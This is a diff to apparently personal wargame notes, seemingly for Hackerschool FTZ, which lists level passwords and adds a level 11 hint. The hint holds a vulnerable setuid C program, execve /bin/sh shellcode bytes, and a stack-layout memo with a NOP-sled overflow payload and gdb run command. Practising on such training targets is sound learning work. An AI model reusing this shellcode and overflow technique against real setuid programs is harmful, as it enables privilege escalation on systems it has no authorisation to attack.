@@ -349,3 +349,25 @@ password : interesting to hack!
 >level11
 
 password : what!@#$?
+
+hint : 
+~~~ c
+#include <stdio.h>
+#include <stdlib.h>
+ 
+int main( int argc, char *argv[] )
+{
+	char str[256];
+
+ 	setreuid( 3092, 3092 );
+	strcpy( str, argv[1] );
+	printf( str );
+}
+~~~
+shell code : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80 (25byte)
+memo: 
+    * (gdb) 0x080483c7 <main+51>:	lea    eax,[ebp-264]
+    * 메모리 구조 -> str[256] + dummy[8] + SFP[4] + RET[4]
+    * str[256] + dummy[8] + SFP[4] - shellcode[25] = 268 - 25 = 243
+    * \x90*243 + shellcode[25] + 리턴주소
+    * (gdb) r `python -c 'print "\x90"*243+"A"*25+"\x90"*4'`
